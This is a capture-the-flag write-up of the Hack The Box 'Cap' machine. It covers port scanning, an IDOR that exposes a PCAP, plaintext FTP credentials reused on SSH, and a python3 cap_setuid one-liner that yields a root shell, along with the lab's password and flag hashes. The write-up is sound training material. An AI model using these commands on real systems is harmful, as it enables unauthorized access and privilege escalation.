# HTB Cap — Write-up Notes

**Date:** 2026-05-31  
**Difficulty:** Easy (Linux)  
**OS:** Ubuntu  
**Target IP:** 10.129.12.255  
**Attack IP (tun0):** 10.10.14.135  
**Rooted:** ✅ Player #91801  

---

## Summary

Cap is an Easy Linux box that chains three weaknesses into a full compromise:

1. **IDOR** on a web app that stores network captures with sequential, predictable IDs
2. **Plaintext FTP credentials** leaking in a pre-existing PCAP, reused on SSH
3. **Linux capability abuse** (`cap_setuid` on Python) for instant privilege escalation to root

No CVEs, no exploits — just logic flaws and misconfigurations. The box teaches fundamentals that appear constantly in real engagements.

---

## Recon

### Port Scan

```
nmap -sC -sV -oN nmap_services.txt 10.129.12.255
nmap -p- --min-rate 10000 -oN nmap_allports.txt 10.129.12.255
```

**Open ports:**

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | FTP | vsftpd 3.0.3 |
| 22/tcp | SSH | OpenSSH 8.2p1 (Ubuntu) |
| 80/tcp | HTTP | Gunicorn (Python WSGI) |

**Key observations:**
- FTP anonymous login disabled — nothing to do here without creds
- SSH is a target once we get credentials
- HTTP is the attack surface — Gunicorn suggests a Python web app

---

## Enumeration

### Web Application (Port 80)

The app presents itself as a **"Security Dashboard"** — IP Config, Network Status, and a `/capture` endpoint that initiates a 5-second live packet capture.

**Capture flow:**
1. Browse to `/capture` → app captures 5s of traffic, saves to disk
2. Redirects to `/data/<id>` where `<id>` is an integer (sequential)
3. File downloadable at `/download/<id>`

**Username leak:** The nav bar displays the logged-in user as `nathan` — one username confirmed without any brute force.

### IDOR Discovery

After triggering a capture, the redirect lands on `/data/1` (or `/data/2`, etc., depending on prior activity on the box).

**The obvious test:** What's at `/data/0`?

```
curl http://10.129.12.255/data/0
```

The app returns a valid PCAP download link at `/download/0` — this is a capture from box setup, created before any player connected. No authentication check, no ownership check. Classic **Insecure Direct Object Reference (IDOR)**.

> **Why this matters:** Sequential IDs with no access control is a top-10 web vulnerability. In real apps this leaks other users' data. Here it leaks a PCAP captured during infrastructure setup.

---

## Foothold

### Extracting Credentials from PCAP

```bash
wget http://10.129.12.255/download/0 -O capture0.pcap
tcpdump -r capture0.pcap -A | grep -A5 "USER\|PASS"
```

The PCAP contains a plaintext FTP session (FTP sends credentials unencrypted over TCP):

```
USER nathan
PASS Buck3tH4TF0RM3!
```

> **Why this matters:** FTP has zero transport encryption. Any PCAP capturing an FTP handshake exposes credentials verbatim. This is why SFTP/FTPS exist. In internal network assessments, finding a PCAP or being in a position to capture FTP is often enough to pivot laterally.

### SSH Access

Password reuse — the FTP credentials work directly on SSH:

```bash
ssh nathan@10.129.12.255
# Password: Buck3tH4TF0RM3!
```

Shell as `nathan`. User flag retrieved:

```
user.txt: ea34748abba367e85ac0aec4f9932bad
```

---

## Privilege Escalation

### Enumeration

Standard Linux privesc checklist. `sudo -l` — nothing useful. Checking **Linux capabilities**:

```bash
getcap -r / 2>/dev/null
```

Output:
```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

**What is `cap_setuid`?**

Linux capabilities are a fine-grained alternative to `sudo` — they grant a specific privilege without handing over full root. `cap_setuid` lets a process call `setuid()` to **change its effective user ID to any UID, including 0 (root)**.

When this capability is attached to an interpreter (Python, Perl, Ruby), the interpreter can invoke `setuid(0)` from within a script — no password, no sudo, no exploit required.

### Exploitation

```bash
python3 -c "import os; os.setuid(0); os.system('/bin/bash')"
```

Breaking it down:
- `os.setuid(0)` — drops UID to root (allowed because `cap_setuid` is set on the binary)
- `os.system('/bin/bash')` — spawns a shell inheriting that UID

Instant root shell. Root flag:

```
root.txt: 3a0175a10c1007605d6b3813fb2cb37b
```

> **Why this matters:** `getcap -r /` is now a standard part of every Linux privesc checklist. Admins sometimes set capabilities thinking it's "safer than sudo" — but `cap_setuid` on any interpreter is effectively the same as unrestricted root. GTFOBins documents this for Python, Perl, Ruby, and others.

---

## Attack Chain

```
nmap → web dashboard → /capture → IDOR (/data/0)
    → download PCAP → tcpdump → FTP creds (plaintext)
    → ssh as nathan → getcap → cap_setuid on python3.8
    → setuid(0) → root shell
```

---

## Key Takeaways

| Finding | Real-World Relevance |
|---------|---------------------|
| IDOR on sequential IDs | Always fuzz `id=0`, `id=1` on any resource URL — lack of ownership checks is pervasive |
| FTP plaintext creds in PCAP | In internal assessments, being on the same segment as FTP traffic = free creds |
| Password reuse across services | One set of leaked creds often works on SSH, RDP, VPN — always test horizontally |
| `cap_setuid` on interpreter | `getcap -r /` belongs on every privesc checklist, right after `sudo -l` |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scan + service detection |
| `curl` / browser | Web app enumeration, IDOR testing |
| `wget` | Download PCAP from vulnerable endpoint |
| `tcpdump` | Parse PCAP, extract FTP credentials |
| `ssh` | Initial access with recovered credentials |
| `getcap` | Discover Linux capability misconfigurations |
| `python3` | Exploit `cap_setuid` for root shell |

---

## References

- [OWASP IDOR](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [GTFOBins — Python cap_setuid](https://gtfobins.github.io/gtfobins/python/#capabilities)
- [Linux Capabilities — man7.org](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [FTP Security — RFC 959 (no encryption)](https://datatracker.ietf.org/doc/html/rfc959)
